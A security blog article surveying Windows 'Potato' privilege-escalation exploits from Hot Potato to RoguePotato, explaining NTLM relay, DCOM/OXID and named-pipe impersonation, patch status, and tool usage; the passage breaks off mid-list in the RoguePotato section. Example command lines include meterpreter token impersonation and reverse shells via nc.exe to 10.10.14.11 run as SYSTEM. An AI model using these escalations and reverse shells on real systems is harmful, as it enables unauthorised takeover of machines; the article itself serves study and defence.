---
title: "In the Potato family, I want them all"
slug: "in-the-potato-family-i-want-them-all"
priority: 2
editor: "wysiwyg"
revisionCount: 11
id: 67
createdAt: "2022-03-11T17:49:20Z"
createdBy: "blackwasp"
updatedAt: "2023-10-29T22:21:39Z"
updatedBy: "blackwasp"
ownedBy: "blackwasp"
views: 82
---
<p id="bkmrk-back-in-2016%2C-an-exp" style="text-align: justify;">Back in 2016, an exploit called <strong>Hot Potato</strong> was revealed and opened a Pandora's box of local privilege escalations at the window manufacturer. Over the next few years, Microsoft kept patching "Won't fix", which eventually got bypassed with new techniques, always bringing new potatoes.</p>
<p id="bkmrk-the-goal-of-this-art" style="text-align: justify;">The goal of this article is to present all the exploits from the first one to the last one, how they work and how to use it. So, let's dive into the incredible Mousline mash up of impersonations and privilege escalations.</p>
<p id="bkmrk-"><a href="/uploads/images/gallery/2022-03/SWqhyXo573goBsZu-image-1647094663263.png" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2022-03/scaled-1680-/SWqhyXo573goBsZu-image-1647094663263.png" alt="image-1647094663263.png"></a></p>
<h2 id="bkmrk-important-notions-an">Concepts and definitions of important terms</h2>
<p id="bkmrk-first-things-first%2C-" style="text-align: justify;">First things first, in the following explains some technical terms and notions will be used. They will be presented here.</p>
<ul id="bkmrk-access-token-%3A-it%E2%80%99s-" style="text-align: justify;"><li><strong>Access token</strong> : It’s an object that describes the security context of a Windows process or thread, something similar to a session cookie on a web site. It is a reference to the ID of the logon session, user and group SIDs, integrity level and privileges held by the user or groups the user is in.<br>There are two types of tokens : primary and impersonation. Primaries are attached to process and impersonations to threads.<br><em>"Impersonation is how a server can assume the identity of a client and the security access that the user has. The impersonation is only temporary and overrides the primary token for just the thread until it finishes."</em> (<a href="https://micahvandeusen.com/the-power-of-seimpersonation/">here</a>)<em><br></em>There are 4 levels of impersonation tokens:
<ul style="text-align: justify;"><li>Anonymous : the server doesn't know the client</li>
<li>Identification : the server knows the client identity, his SIDs and privileges for access control. Most common tokens and useless for privesc purpose</li>
<li>Impersonation (Impersonation in Impersonation...close to the Inception) : server can act in behalf of the client, think about Kerberos delegation. The so much desired for privileges escalation.</li>
<li>Delegation : server can impersonate the client on both local and remote systems.</li>
</ul></li>
</ul><ul id="bkmrk-oxid-resolver-%3A-it-i" style="text-align: justify;"><li><strong>COM Object (Component Object Model)</strong> : <a href="https://docs.microsoft.com/en-us/windows/win32/com/component-object-model--com--portal">Microsoft definition</a>
<blockquote><em><br>COM is a platform-independent, distributed, object-oriented system for creating binary software components that can interact. COM is the foundation technology for Microsoft's OLE (compound documents) and ActiveX (Internet-enabled components) technologies.</em></blockquote>
</li>
</ul><ul id="bkmrk-oxid-resolver-%3A-it-i-0" style="text-align: justify;"><li><strong>OXID Resolver</strong> : It is a service that runs on every machine that supports COM. It stores the RPC string bindings that are necessary to connect with remote objects and provides them to local clients. Basically, it permits a client to resolve a COM server object and bind to it for methods invocations.<br><ul style="text-align: justify;"><li>OXID resolution sequence : <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/dfce8f13-1ae2-4cd3-aadd-03edf6290407">Microsoft explain</a></li>
</ul></li>
</ul><ul id="bkmrk-imarshal-interface-%3A" style="text-align: justify;"><li style="text-align: justify;"><strong>IMarshal interface</strong> : <a href="https://docs.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-imarshal">Microsoft definition</a><br><blockquote><em>Enables a COM object to define and manage the marshaling of its interface pointers.[...]<br></em><em>Marshaling is the process of packaging data into packets for transmission to a different process or computer.</em><em>Unmarshaling is the process of recovering that data at the receiving end.</em><em>In any given call, method arguments are marshaled and unmarshaled in one direction, while return values are marshaled and unmarshaled in the other.[...]<br></em><em>IMarshal provides methods for creating, initializing, and managing a proxy in a client process; it does not dictate how the proxy should communicate with the original object. The COM default implementation of IMarshal uses RPC. When you implement this interface yourself, you are free to choose any method of interprocess communication you deem to be appropriate for your application—shared memory, named pipe, window handle, RPC—in short, whatever works.</em></blockquote>
</li>
<li style="text-align: justify;"><strong>IStorage interface</strong> : <a href="https://docs.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-istorage">Microsoft definition</a><br><blockquote>The IStorage interface supports the creation and management of structured storage objects. Structured storage allows hierarchical storage of information within a single file, and is often referred to as "a file system within a file". Elements of a structured storage object are storages and streams. Storages are analogous to directories, and streams are analogous to files.</blockquote>
</li>
</ul><ul id="bkmrk-clsid-%3A-a-clsid-is-a" style="text-align: justify;"><li style="text-align: justify;"><strong>CLSID</strong> : A CLSID is a unique global identifier that identifies a COM class object.</li>
</ul><p id="bkmrk-now%2C-it%27s-time-for-e" style="text-align: justify;">Now, it's time for exploits !<br>(i.e. For each exploit, the "Does it still work ?" section means in a fully up-to-date environment)</p>
<h2 id="bkmrk-hot-potato">Hot Potato</h2>
<ul id="bkmrk-first-exploit-of-the"><li style="text-align: justify;">First exploit of the serie by <a href="https://twitter.com/breenmachine">@breenmachine</a>, disclosed in 2016</li>
<li style="text-align: justify;">Valid on Windows 7,8,10, Server 2008 &amp; 2012, if not patched</li>
</ul><h5 id="bkmrk-how-it-works" style="text-align: justify;">How it works</h5>
<p id="bkmrk-when-a-dns-lookup-fa" style="text-align: justify;">When a DNS lookup fail, the computer try to resolve an hostname with <strong>NBNS</strong> lookup in broadcast. For a privilege escalation purpose, it is not possible to sniff the network and catch the requests because it needs administrator privileges. However, it is possible to flood the target host (<code>127.0.0.1</code> here) with fake <strong>NBNS</strong> responses when a request is made. We just have to know for which hostname the request is realized, and the <strong>TXID</strong> value that must match in request and response. It is a 2 bytes value that can be easily brute forced since we are in UDP on <code>127.0.0.1</code>.<br>To deal with a possible DNS record that can match during the initial DNS lookup, Hot Potato uses the "<em>UDP port exhaustion</em>" technique : it bind on <strong>ALL</strong> the UDP ports, leading to a DNS lookup fail.</p>
<p id="bkmrk-by-default%2C-some-ins" style="text-align: justify;">By default, some installed services like <strong>Internet Explorer</strong> or <strong>Windows Update</strong> try to resolve <code>http://wpad/wpad.dat</code> regularly, that is generally doesn't exist on the network.<br>Hot Potato will flood the target machine (still <code>127.0.0.1</code>) with <strong>NBNS</strong> response for the hostname <strong>WPAD</strong>, saying it is located in <code>127.0.0.1</code>; and in parallel it will run an HTTP server to catch the requests. Even if the spoofing attack is ran by a low privileged user it will catch all the requests.</p>
<p id="bkmrk-in-2008-microsoft-ha" style="text-align: justify;">In 2008 Microsoft has patched the <strong>same protocol</strong> reflective NTLM relay (like <strong>SMB-&gt;SMB</strong> on the same machine), but not the <strong>cross protocol</strong> reflective NTLM relay. So, <strong>HTTP-&gt;SMB</strong> on the same machine still worked when Hot Potato has been created. Hot Potato redirect all the catched WPAD requests to <code>http://localhost/GETHASHESxxxxx</code> that will response with a <strong>401</strong> error and ask for NTLM authentication. NTLM hash is then relay to SMB to start a new service, as <strong>SYSTEM</strong> if the original WPAD request come from Windows Update for example.</p>
<h5 id="bkmrk-examples-of-command-" style="text-align: justify;">Examples of command lines</h5>
<pre id="bkmrk-%23windows-7-potato.ex"><code class="language-Powershell">#Windows 7
Potato.exe -ip -cmd [cmd to run] -disable_exhaust true

#Windows Server 2008
Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true -spoof_host WPAD.DOMAIN.LOCAL

#Windows 8/10/Server 2012
Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true and wait for certificates update</code></pre>
<h5 id="bkmrk-does-it-still-work-%3F" style="text-align: justify;">Does it still work ?</h5>
<p id="bkmrk-no." style="text-align: justify;">No.</p>
<ul id="bkmrk-reflective-cross-pro" style="text-align: justify;"><li>Reflective cross protocol relay patched on MS16-075</li>
<li>WPAD resolution patched on CVE-2016-3213, and does not send credential when requesting the PAC file (CVE-2016-3236)</li>
</ul><p id="bkmrk-for-further-read%2C-it" style="text-align: justify;">For further read, it's <a href="https://foxglovesecurity.com/2016/01/16/hot-potato/">here.</a></p>
<p id="bkmrk-source-code" style="text-align: justify;"><a href="https://github.com/foxglovesec/Potato">Source code</a></p>
<h2 id="bkmrk-rottenpotato">RottenPotato</h2>
<ul id="bkmrk-by-%40breenmachine%2C-di"><li>By <a href="https://twitter.com/breenmachine">@breenmachine</a>, disclosed in 2016</li>
</ul><h5 id="bkmrk-how-it-works-0" style="text-align: justify;">How it works</h5>
<p id="bkmrk-rottenpotato-is-a-ho" style="text-align: justify;">RottenPotato is a Hot Potato exploit, but with really strong steroids. Hot Potato was a little bit instable, sometimes it was needed to wait for Windows Update and WPAD cache refresh for several hours, etc. RottenPotato will use <strong>DCOM/RPC</strong> call to trigger the Net-NTLM authentication.</p>
<p id="bkmrk-it-is-mainly-based-o" style="text-align: justify;">It is mainly based on three things:</p>
<ul id="bkmrk-rpc-in-running-with-" style="text-align: justify;"><li>RPC in running with NT AUTHORITY/SYSTEM and it will authent on a proxy if we call the API <strong>CoGetInstanceFromIStorag</strong></li>
<li>RPC on port 135 will reply to all request performed by a first RPC</li>
<li><strong>AcceptSecurityContext</strong> API call to locally impersonate NT AUTHORITY/SYSTEM</li>
</ul><p id="bkmrk-%C2%A0" style="text-align: justify;">RottenPotato create an instance of an <strong>IStorage</strong> object which points to <code>127.0.0.1:6666</code>. Then, via an API call to <code>CoGetInstanceFromIStorage()</code>, it tells to COM to fetch a BITS object (CLSID <code>4991d34b-80a1-4291-83b6-3328366b9097</code>) from the IStorage instance, which points to <code>127.0.0.1:6666</code>.<br>On the port 6666 a TCP listener is running. All COM packets arriving on this listener will be redirected to the RPC port 135 of the machine in order to let the protocol discuss normally until a potential Net-NTLM authentication arrive.</p>
<p id="bkmrk-after-some-communica" style="text-align: justify;">After some communications between COM and the RPC port, COM eventually send a <strong>NTLM Type 1</strong> (Negociate) message. RottenPotato catch it and rip out the NTLM section of the packet to start the process of token negotiation by passing the <strong>NTLM Type 1</strong> in a call to <code>AcceptSecurityContext()</code>. The response to this call is a <strong>NTLM Type 2</strong> (Challenge) message. We will tell this is the <strong>Type 2 number #1</strong>.<br>In parallel, the NTLM Type 1 is also forwarded to the RPC port 135.</p>
<p id="bkmrk-following-the-ntlm-t" style="text-align: justify;">Following the NTLM Type 1 packet forward to the RPC port 135, the port will response with an <strong>NTLM Type 2</strong> (Challenge) packet (this one will be the <strong>number #2</strong>). RottenPotato catch it, and replace the NTLM blob inside with the NTLM blob from the NTLM Type 2 received after the <code>AcceptSecurityContext()</code> API call (the <strong>number #1</strong>, still following ?). Why ? Because the authenticating client (SYSTEM here) will use two particular fields from the <strong>NTLM Type 2</strong> packet to authenticate : the "<strong>NTLM Server Challenge</strong>" and the "<strong>Reserved</strong>" fields.<br>RottenPotato pass the values obtained during the <code>AcceptSecurityContext()</code> API call to force the SYSTEM account to authenticate with them and thus the SYSTEM account will <em>craft</em> a token for us and not for RPC.</p>
<p id="bkmrk-after-sending-the-nt" style="text-align: justify;">After sending the <strong>NTLM Type 2</strong> (Challenge) to COM, it will replies with a <strong>NTLM Type 3</strong> (Authenticate) packet following the backend authentication in memory. RottenPotato makes a new call to <code>AcceptSecurityContext()</code> with it and uses the reply to call <code>ImpersonateSecurityContext()</code> to obtain the final <strong>impersonation token</strong>.</p>
<p id="bkmrk-now-to-use-the-imper" style="text-align: justify;">Now to use the impersonation token, the privilege "<strong>SeImpersonatePrivilege</strong>" or equivalent (like "<strong>SeAssignPrimaryTokenPrivilege</strong>") is needed. Additionally, RottenPotato relies on a <strong>Meterpreter</strong> session with the <strong>Incognito</strong> mode to use the impersonation token. Basically, the Incognito module permits to steal token the same way web cookie stealing works, by replaying that temporary key when asked to authenticate.</p>
<h5 id="bkmrk-examples-of-command--0">Examples of command lines</h5>
<pre id="bkmrk-%23in-a-meterpreter-se"><code class="language-shell">#In a meterpreter session
use incognito
execute -cH -f ./rottenpotato.exe
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"</code></pre>
<h5 id="bkmrk-does-it-still-work-%3F-0" style="text-align: justify;">Does it still work ?</h5>
<p id="bkmrk-no.-doesn%27t-work-aft" style="text-align: justify;">No. Doesn't work after <strong>Windows 10 1809</strong> &amp; <strong>Windows Server 2019</strong> because of patches on DCOM and the OXID resolver.</p>
<p id="bkmrk-for-further-read%2C-it-0" style="text-align: justify;">For further read, it's <a href="https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/">here.</a></p>
<p id="bkmrk-source-code-0" style="text-align: justify;"><a href="https://github.com/foxglovesec/RottenPotato">Source code</a></p>
<h2 id="bkmrk-lonelypotato" style="text-align: justify;">LonelyPotato</h2>
<ul id="bkmrk-by-%40decoder_it%2C-disc" style="text-align: justify;"><li>By <a href="https://twitter.com/decoder_it">@decoder_it</a>, disclosed in 2017</li>
</ul><h5 id="bkmrk-how-it-works-1" style="text-align: justify;">How it works</h5>
<p id="bkmrk-lonelypotato-is-a-ro" style="text-align: justify;">LonelyPotato is a RottenPotato but without <strong>meterpreter Incognito</strong> needed. It directly implements the API call to <code>CreateProcessAsUser()</code> in order to impersonate the primary token with the <strong>SeAssignPrimaryToken</strong> privilege (this one can be used in Session 0, which is normally the session used by service accounts like IIS).</p>
<h5 id="bkmrk-does-it-still-work-%3F-1" style="text-align: justify;">Does it still work ?</h5>
<p id="bkmrk-deprecated-for-the-s" style="text-align: justify;">Deprecated for the same reason as RottenPotato.</p>
<p id="bkmrk-for-further-read%2C-it-1" style="text-align: justify;">For further read, it's <a href="https://decoder.cloud/2017/12/23/the-lonely-potato/">here</a></p>
<p id="bkmrk-source-code-%28really-" style="text-align: justify;"><a href="https://github.com/decoder-it/lonelypotato">Source code</a> (really really instructive !)</p>
<h2 id="bkmrk-rottenpotatong">RottenPotatoNG</h2>
<h5 id="bkmrk-how-it-works-2">How it works</h5>
<p id="bkmrk-it-is-the-same-thing">It is the same thing as LonelyPotato, but that's the "official Rotten portage" without Incognito.</p>
<p id="bkmrk-source-code-1"><a href="https://github.com/breenmachine/RottenPotatoNG">Source code</a></p>
<h2 id="bkmrk-juicypotato">JuicyPotato</h2>
<ul id="bkmrk-by-ohpe-%28%40giutro%29-an"><li>By Ohpe (<a href="https://twitter.com/Giutro">@Giutro</a>) and <a href="https://twitter.com/decoder_it">@decoder_it</a>, disclosed in 2018</li>
</ul><h5 id="bkmrk-how-it-works-3" style="text-align: justify;">How it works</h5>
<p id="bkmrk-surelly-one-of-the-m" style="text-align: justify;">Surelly one of the most famous exploit of the serie, JuicyPotato is a RottenPotato on steroids (encore...ça fait beaucoup là, non ?). It permits to specify which <strong>CLSID</strong> to abuse instead of the <strong>BITS' CLSID</strong> hardcoded in the RottenPotato exploit. Additionally, it is possible to specify our COM server instead of the arbitrary <code>127.0.0.1:6666</code>, and no need of meterpreter of course.<br>They discovered that, other than BITS, there are several out of process COM servers identified by specific CLSIDs that could be abused. A list of interesting CLSIDs is presented <a href="http://ohpe.it/juicy-potato/CLSID/">here</a>.</p>
<p id="bkmrk-a-usuable-clsid-need" style="text-align: justify;">A usuable CLSID needs at least to:</p>
<ul id="bkmrk-be-instantiable-by-t" style="text-align: justify;"><li>Be instantiable by the current user, normally a service user which has <strong>impersonation privileges</strong></li>
<li>Implement the <strong>IMarshal interface</strong></li>
<li>Run as an elevated user (SYSTEM, Administrator, <em>Sylvain Durif</em>, ...)</li>
</ul><p id="bkmrk-other-new-features%2C-" style="text-align: justify;">Other new features, it is possible to choose which function to use depending of the privilege the user has: <code>CreateProcessWithToken()</code> for <strong>SeImpersonate</strong> or <code>CreateProcessAsUser()</code> for <strong>SeAssignPrimaryToken</strong>, or both. It is also possible to specify another RPC servers than the <code>127.0.0.1:135</code> for the relay, for stealth purpose.</p>
<h5 id="bkmrk-examples-of-command--1" style="text-align: justify;">Examples of command lines</h5>
<pre id="bkmrk-%23juicypotato-with-th"><code class="language-Powershell">#JuicyPotato with the BITS' CLSID, the COM listener port on 1337, and both functions tested
./juicypotato.exe -l 1337 -p C:\Windows\System32\powershell.exe -t *

#JuicyPotato with a .bat execution, a different CLSID, only the function CreateProcessWithTokenW used and a COM listener on 1337
./juicypotato.exe -l 1337 -t CreateProcessWithTokenW -p pathToBat -c {e60687f7-01a1-40aa-86ac-db1cbf673334}</code></pre>
<h5 id="bkmrk-does-it-still-work-%3F-2" style="text-align: justify;">Does it still work ?</h5>
<p id="bkmrk-no.-it-is-now-imposs" style="text-align: justify;">No. It is now impossible to specify a custom port for the OXID resolver (only port 135), and just forward the resolution to a local fake RCP server via a remote OXID resolver give an <strong>ANONYMOUS LOGON</strong>. It has been patched around the update to Windows 10 1809.</p>
<p id="bkmrk-for-further-read%2C-it-2" style="text-align: justify;">For further read, it's <a href="http://ohpe.it/juicy-potato/">here</a> and <a href="https://decoder.cloud/2018/10/29/no-more-rotten-juicy-potato/">here.</a></p>
<p id="bkmrk-source-code-2" style="text-align: justify;"><a href="https://github.com/ohpe/juicy-potato">Source code</a></p>
<h2 id="bkmrk-ghostpotato" style="text-align: justify;">GhostPotato</h2>
<ul id="bkmrk-by-%40danyaldrew%2C-disc"><li style="text-align: justify;">By <a href="https://twitter.com/danyaldrew" target="_blank" rel="noopener">@danyaldrew</a>, disclosed in 2019</li>
</ul><h5 id="bkmrk-how-it-works-4" style="text-align: justify;">How it works</h5>
<p id="bkmrk-ghostpotato-is-prett" style="text-align: justify;">GhostPotato is pretty well named. First because it has been released during the Halloween period, then because it brings back from the death the NTLM Reflection.<br>The first thing to understand is how Microsoft has patched the original NTLM Reflection attacks with <strong>MS08-68</strong> and <strong>MS09-13</strong> : when <code>InitializeSecurityContext()</code> is called at the begining of the NTLM authentication, the argument <code>pszTargetName</code> is set to the target SPN. After MS08-68, accessing the SMB share <code>\\test\C$</code> will result with <code>pszTargetName</code> set to <code>cifs/test</code>. MS09-13 has the same purpose, but for HTTP.</p>
<p id="bkmrk-so-now%2C-how-the-miti" style="text-align: justify;">So now, how the mitigations really work for the <strong>LSASS</strong> process? LSASS keep a cache list of all the NTLM challenges recently issued with the associated SPN in order to detect NTLM Reflection attempts.<br>The victim creates the Security Context with the target SPN (for example, <code>HTTP/Attacker</code>) by calling <code>InitializeSecurityContext()</code> against LSASS. This Security Context is pushed in a <strong>Security Context List</strong>. LSASS answers to the victim with a <strong>NEGOTIATE</strong> message that is relayed to the specified SPN (the attacker), and the attacker relay it, for example, to the SMB server.<br>The SMB server calls <code>AcceptSecurityContext()</code> against LSASS which will answer with the <strong>CHALLENGE</strong>. After relay, the <strong>CHALLENGE</strong> arrive to the victim that will use it with <code>InitializeSecurityContext()</code>. At this point, the issued challenge is stored in a <strong>Challenge Table</strong>.<br>LSASS sends the <strong>AUTHENTICATE</strong> message that the attacker will relay to the SMB server (the SPN is still <code>HTTP/Attacker</code>). The SMB Server calls <code>AcceptSecurityContext()</code> with the <strong>AUTHENTICATE</strong> message and LSASS will verify the challenge validity in the Challenge Table and...the authentication process is killed because <code>HTTP/Attacker</code> is not a valid SPN for the local machine: NTLM Reflection has been detected. If the SPN doesn't match a specific list of authorized SPNs, the authentication is rejected.</p>
<p id="bkmrk-but-%21-do-the-entries" style="text-align: justify;"><strong>But</strong> ! Do the entries in the Challenge Table have an infinite lifetime? The answer is NO, otherwise I will not be writing this paragraph. The challenges older than 300 seconds are deleted when the deletion function is called, and this function is executed everytime a new challenge is added !<br>The idea behind GhostPotato is to exploit this behavior : when the attacker receives the <strong>AUTHENTICATE</strong> message, instead of immediatly relay it the SMB server he will keep it and sleep during more than 300s. After this time, a <em>dumb</em> authentication is realized with a wrong password in order to flush the table and the <strong>AUTHENTICATE</strong> message is finally relayed. When LSASS will lookup in the Challenge Table it will find nothing and...accept the authentication (<em>Woop...Woop...That's the sound of Microsoft</em>).</p>
<p id="bkmrk-since-a-local-authen" style="text-align: justify;">Since a local authentication is used at the begining, the access level gained with the attack will depend of the victim's access rights.</p>
<h5 id="bkmrk-examples-of-command--2" style="text-align: justify;">Examples of command lines</h5>
<pre id="bkmrk-%23works-like-ntlmrela"><code class="language-shell">#Works like ntlmrelayx, based on Impacket
python3 ghost.py -smb2support -of out -c whoami</code></pre>
<h5 id="bkmrk-does-it-still-work-%3F-3" style="text-align: justify;">Does it still work ?</h5>
<p id="bkmrk-no.-patched-is-the-s">No. Patched in the security patch <a href="https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2019-1384" target="_blank" rel="noopener">CVE-2019-1384</a>.</p>
<p id="bkmrk-for-further-read%2C-it-3" style="text-align: justify;">For further read, it's <a href="https://shenaniganslabs.io/2019/11/12/Ghost-Potato.html">here.</a></p>
<p id="bkmrk-source-code-3" style="text-align: justify;"><a href="https://github.com/Ridter/GhostPotato">Source code</a></p>
<h2 id="bkmrk-sweetpotato" style="text-align: justify;">SweetPotato</h2>
<ul id="bkmrk-by-ccob%2C-disclosed-i" style="text-align: justify;"><li>By <a href="https://twitter.com/_EthicalChaos_">CCob</a>, disclosed in 2020</li>
</ul><h5 id="bkmrk-how-it-works-5" style="text-align: justify;">How it works</h5>
<p id="bkmrk-it%27s-basically-a-c%23-" style="text-align: justify;">It's basically a C# portage of JuicyPotato, really useful for direct in memory loading, with CobaltStrike for example, without dropping the binary on the disk.</p>
<p id="bkmrk-it-also-add-another-" style="text-align: justify;">It also add another way to exploit : when a <strong>BITS COM</strong> object is instancied, if the service is not already running BITS will attempt to connect to the local <strong>WinRM</strong> service on port 5985 with a first <strong>NTLM Negotiate</strong> message as SYSTEM. By running a fake WinRM server, it is possible to catch this <strong>Negotiate</strong> message, extract the <strong>NTLMSSP packet</strong> and <strong>SPNEGO header</strong>, and call <code>InitTokenContextBuffer()</code> to create a server side context with <code>AcceptSecurityContext()</code> (yeah, that's exactly what you think). This server side context (which is basically the <strong>Challenge Type 2</strong> part of the Net-NTLM authentication) can be sent in a <strong>401 Unauthorized</strong> HTTP response to the BITS client, client who will respond with an <strong>Authorization Type 3</strong>. The NTLMSSP part on this response is used with <code>AcceptSecurityContext()</code> to obtain <em>el famoso</em> token. This exploit was firstly exploited in <a href="https://github.com/antonioCoco/RogueWinRM">RogueWinRM</a> in 2019.</p>
<p id="bkmrk-in-case-where-winrm-" style="text-align: justify;">In case where WinRM is not already running, like on <strong>Windows 10</strong> by default, SweetPotato will setup a server on the port 5985 and force BITS to authenticate, as SYSTEM. Since the previous potato exploits don't work anymore after <strong>Windows 1809</strong> and <strong>Server 2019</strong> because of the DCOM patch, SweetPotato will automatically try to exploit the WinRM path if possible when it encounter the patch.</p>
<p id="bkmrk-now%2C-sweetpotato-als" style="text-align: justify;">Now, SweetPotato also embeds the PrintSpoofer exploit, which will be presented in the next section.</p>
<h5 id="bkmrk-examples-of-command--3" style="text-align: justify;">Examples of command lines with CobaltStrike (ftw)</h5>
<pre id="bkmrk-%23sweetpotato-with-ne"><code class="language-Powershell">#SweetPotato with Netcat execution and arguments, directly in memory, via the WinRM attack
execute-assembly ./SweetPotato -p ./nc.exe -a '10.10.14.11 4646 -e powershell' -e WinRM</code></pre>
<h5 id="bkmrk-does-it-still-work-%3F-4" style="text-align: justify;">Does it still work ?</h5>
<p id="bkmrk-yes.-there-is-no-act" style="text-align: justify;">Yes. There is no actual <em>official</em> patch for PrintSpoofer or the WinRM exploit.</p>
<p id="bkmrk-for-further-read%2C-it-4" style="text-align: justify;">For further read, it's <a href="https://www.pentestpartners.com/security-blog/sweetpotato-service-to-system/">here</a> and <a href="https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/">here.</a></p>
<p id="bkmrk-source-code-4" style="text-align: justify;"><a href="https://github.com/CCob/SweetPotato">Source code</a></p>
<h2 id="bkmrk-printspoofer" style="text-align: justify;">PrintSpoofer</h2>
<ul id="bkmrk-by-%40itm4n%2C-disclosed" style="text-align: justify;"><li>By <a href="https://twitter.com/itm4n">@itm4n</a>, disclosed in 2020</li>
</ul><p id="bkmrk-yeah%2C-it%27s-not-a-%2Apo" style="text-align: justify;">Yeah, it's not a <em>*Potato</em> exploit by the name, but it's the same by the purpose...and that's my article, so I will write about it.</p>
<p id="bkmrk--0" style="text-align: justify;"><a href="/uploads/images/gallery/2022-03/kFQ0FUSOUKlXqiEc-image-1647094564583.png" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2022-03/scaled-1680-/kFQ0FUSOUKlXqiEc-image-1647094564583.png" alt="image-1647094564583.png"></a></p>
<h5 id="bkmrk-how-it-works-6" style="text-align: justify;">How it works</h5>
<p id="bkmrk-the-idea-behind-prin" style="text-align: justify;">The idea behind PrintSpoofer is to use <strong>Named Pipe</strong> for impersonation with the <code>ImpersonateNamedPipeClient()</code> function. PrintSpoofer first creates a Named Pipe with <code>CreateNamedPipe()</code> and grant Everyone to access it. Then, <code>ConnectNamedPipe()</code> pause the thread waiting for a client connection. When a connection arrives, <code>ImpersonateNamedPipeClient()</code> realises the impersonation and it is possible to execute some code as the user.</p>
<p id="bkmrk-to-coerce-the-system">To coerce the SYSTEM authentication, PrintSpoofer use the good old <strong>PrinterBug</strong> attack. The PrinterBug exploit is based on the Print Service function <code>RpcRemoteFindFirstPrinterChangeNotificationEx()</code> which permits to send change notifications to a print client...and this function use RPC over Named Pipe to work.<br>However, by default to Spooler will send the notification to the <code>\\HOSTNAME\pipe\spoolss</code> Named Pipe, and this Pipe already exists and is owned by the SYSTEM, so impossible to create it.<br>BUT !</p>
<blockquote id="bkmrk-if-the-hostname-cont">
<p><em>If the hostname contains a /, it will pass the path validation checks but, when calculating the path of the named pipe to connect to, normalization will transform it into a \. This way, we can partially control the path used by the server!.</em></p>
<p><em>- </em><a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/"><em><span style="text-decoration: underline;">itm4n</span></em></a></p>
</blockquote>
<p id="bkmrk-to-resume%2C-a-path-li" style="text-align: justify;">To resume, a path like <code>\\HOSTNAME/pipe/foo123</code> will be transformed into <code>\\HOSTNAME\pipe\foo123\pipe\spoolss</code>.</p>
<p id="bkmrk-and-it-works-%21-the-p" style="text-align: justify;">And it works ! The Printer function effectively connects to the controlled Named Pipe and a SYSTEM token is received. Now, the impersonation can be done.</p>
<h5 id="bkmrk-examples-of-command--4" style="text-align: justify;">Examples of command lines</h5>
<pre id="bkmrk-%23from-an-interactive"><code class="language-Powershell">#From an interactive shell, spawn a SYSTEM shell
./PrintSpoofer.exe -i -c cmd

#Spawn a SYSTEM shell
./PrintSpoofer.exe -c "nc.exe 10.10.14.11 1337 -e cmd"</code></pre>
<h5 id="bkmrk-does-it-still-work-%3F-5" style="text-align: justify;">Does it still work ?</h5>
<p id="bkmrk-yes.-no-official-pat" style="text-align: justify;">Yes. No official patch for the moment.</p>
<p id="bkmrk-for-further-read%2C-it-5" style="text-align: justify;">For further read, it's <a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/">here.</a></p>
<p id="bkmrk-source-code-5" style="text-align: justify;"><a href="https://github.com/itm4n/PrintSpoofer">Source code</a></p>
<h2 id="bkmrk-roguepotato" style="text-align: justify;">RoguePotato</h2>
<ul id="bkmrk-by-%40decoder_it-and-%40" style="text-align: justify;"><li>By <a href="https://twitter.com/decoder_it">@decoder_it</a> and <a href="https://twitter.com/splinter_code">@splinter_code</a>, disclosed in 2020</li>
</ul><h5 id="bkmrk-how-it-works-7" style="text-align: justify;">How it works</h5>
<p id="bkmrk-since-the-patches-of" style="text-align: justify;">Since the patches of JuicyPotato, it is now impossible to specify a custom port for the OXID resolver (only port 135), and just forward the resolution to a local fake RCP server via a remote OXID resolver give an <strong>ANONYMOUS LOGON</strong>. Resolving the OXID resolution to a controlled server permits to obtain a identification token during the <code>IRemUnkown2</code> interface query, but remember, identification token are not useful for impersonation purpose.</p>
<p id="bkmrk-the-exploit-idea-is-" style="text-align: justify;">The exploit idea is to call an OXID resolver method with a forged response to trigger a privileged authentication against a controlled listener. For this, the <code>ResolveOxid[2]</code> function is a good candidat because it permits to specify an endpoint with an IP address and a <strong>TowerId</strong> (ID of the protocol to use in RPC call).<br>The TowerId "<strong>ncacn_np</strong>" permits to deal with <strong>Connection-Oriented</strong> Named Pipes, and therefore with "<strong>epmapper</strong>". It's related to the "<strong>RpcEptMapper</strong>" service, an RPC endpoints mapper through Named Pipes instead of the classic TCP port 135. The advantage of this service is it shares the same process space as "<strong>rpcss</strong>", and both run with the <strong>NETWORK SERVICE</strong> account (basically, impersonating this account permits to steal a SYSTEM token, <a href="https://www.tiraniddo.dev/2020/04/sharing-logon-session-little-too-much.html">according to this James Forshaw's paper</a>).</p>
<p id="bkmrk-by-default%2C-rpcss-al" style="text-align: justify;">By default, <strong>RPCSS</strong> always tries to connect to the pipe <code>\pipe\epmapper</code>, so it is impossible to redirect it to <code>ncacn_np:localhost[\pipe\roguepotato]</code>. However, the PrintSpoofer exploit has revealed a new attack way : inserting <code>/</code> in the hostname will be interpreted as the partial path of the Named Pipe. Specifying <code>ncacn_np:localhost/pipe/roguepotato[\pipe\epmapper]</code> is interpreted and <strong>RPCSS</strong> is well redirected to the controlled Named Pipe. A <strong>NETWORK SERVICE</strong> account's token is obtained.</p>
<p id="bkmrk-to-resume%2C-the-attac" style="text-align: justify;">To resume, the attack takes place as follows :</p>
<ol id="bkmrk-roguepotato-instruct" style="text-align: justify;"><li>RoguePotato instruct the DCOM server to perform a remote OXID query (by triggering <strong>IStorage</strong> with <code>CoGetInstanceFromIStorage()</code>) on a remote IP (the attacker IP).</li>
<li>On the remote IP, a "socat" listener redirects the <strong>OXID resolutions</strong> requests to a <strong>fake OXID RPC Server</strong>. At this point, an <strong>ANONYMOUS LOGON</strong> request arrives.</li>
<li>The fake OXID RPC server implements the <code>ResolveOxid2</code> server procedure, which will point to a controlled Named Pipe <code>[ncacn_np:localhost/pipe/roguepotato[\pipe\epmapper]]</code></li>
